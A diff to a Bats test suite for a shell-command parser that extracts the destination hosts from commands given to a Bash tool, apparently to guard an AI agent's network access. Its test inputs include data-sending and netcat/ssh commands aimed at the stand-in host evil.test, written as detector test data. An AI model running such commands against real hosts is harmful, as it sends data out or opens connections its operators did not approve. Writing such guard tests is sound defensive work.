@@ -55,8 +55,8 @@ _hosts() { customs_destination_hosts "$1" "$2" | paste -sd, -; }
 	[ "$status" -eq 0 ]
 	[ "$output" = "evil.test" ]
 	run customs_destination_hosts Bash "bash -c \"curl https://ok.test; nc evil.test 80\""
-	[ "$status" -eq 2 ]
-	[ "$output" = "ok.test" ]
+	[ "$status" -eq 0 ]
+	[ "$output" = "$(printf 'evil.test\nok.test')" ]
 }
 
 @test "path-qualified tools are checked" {
@@ -89,11 +89,49 @@ _hosts() { customs_destination_hosts "$1" "$2" | paste -sd, -; }
 	[ "$(_hosts Bash "curl -s \"Evil.Test:8080\"")" = "evil.test" ]
 }
 
-@test "a network segment with no readable host exits 2 and keeps the readable hosts" {
-	run customs_destination_hosts Bash "echo https://ok.test; printf x | nc evil.test 80"
+@test "every word after curl or wget that is not an option is a destination" {
+	[ "$(_hosts Bash "curl -d x https://ok.test/ evil.test.")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "curl -d x https://ok.test/ evil.test?x")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "curl -d x https://ok.test/ 1.2.3.4")" = "1.2.3.4,ok.test" ]
+	[ "$(_hosts Bash "curl -d x https://ok.test/ localhost:9")" = "localhost,ok.test" ]
+	[ "$(_hosts Bash "curl -d x https://ok.test/ evil.t3st")" = "evil.t3st,ok.test" ]
+	run customs_destination_hosts Bash "curl -d x https://ok.test/ [::1]"
 	[ "$status" -eq 2 ]
 	[ "$output" = "ok.test" ]
-	run customs_destination_hosts Bash "git push https://github.com/x/y; ssh evil.test echo hi"
+}
+
+@test "an option's value is skipped, and a proxy is read as a destination" {
+	[ "$(_hosts Bash "curl -sS -o out.json -w '%{http_code}' -H 'X: y' https://ok.test/")" = "ok.test" ]
+	[ "$(_hosts Bash "curl -X POST evil.test")" = "evil.test" ]
+	[ "$(_hosts Bash "curl --proxy evil.test https://ok.test")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "curl --proxy=evil.test https://ok.test")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "curl https://ok.test > evil.test")" = "ok.test" ]
+	run customs_destination_hosts Bash "wget -e https_proxy=evil.test https://ok.test"
+	[ "$status" -eq 2 ]
+}
+
+@test "the first positional after nc, ssh or sftp is read beside any URL" {
+	[ "$(_hosts Bash "nc evil.test 80 <<< 'https://ok.test x'")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "ssh -p 2222 -i k deploy@evil.test echo https://ok.test")" = "evil.test,ok.test" ]
+	[ "$(_hosts Bash "ssh -J jump.test box.test uptime")" = "box.test,jump.test" ]
+	[ "$(_hosts Bash "sftp -P 22 evil.test")" = "evil.test" ]
+}
+
+@test "httpie and xh read the URL, not the request items after it" {
+	[ "$(_hosts Bash "http POST ok.test Authorization:'token x' a=b")" = "ok.test" ]
+	[ "$(_hosts Bash "xh :3000/x")" = "localhost" ]
+}
+
+@test "scp and rsync read only host:path words" {
+	[ "$(_hosts Bash "scp -P 22 ./f deploy@box.test:/srv")" = "box.test" ]
+	[ "$(_hosts Bash "rsync -a ./a/b:c localhost:/srv")" = "localhost" ]
+}
+
+@test "a network segment with no readable host exits 2 and keeps the readable hosts" {
+	run customs_destination_hosts Bash "echo https://ok.test; printf x | nc \"\$HOST\" 80"
+	[ "$status" -eq 2 ]
+	[ "$output" = "ok.test" ]
+	run customs_destination_hosts Bash "git push https://github.com/x/y; ssh \"\$HOST\" echo hi"
 	[ "$status" -eq 2 ]
 	[ "$output" = "github.com" ]
 	run customs_destination_hosts Bash "curl https://ok.test && curl \"\$(cat url.txt)\""
@@ -118,7 +156,7 @@ _hosts() { customs_destination_hosts "$1" "$2" | paste -sd, -; }
 	[ -z "$output" ]
 	run customs_destination_hosts Bash "nc evil.test 80 <<< x@${oa}"
 	[ "$status" -eq 2 ]
-	[ -z "$output" ]
+	[ "$output" = "evil.test" ]
 	run customs_destination_hosts Bash "curl https://ok.test -u x@${oa}"
 	[ "$status" -eq 2 ]
 	[ "$output" = "ok.test" ]
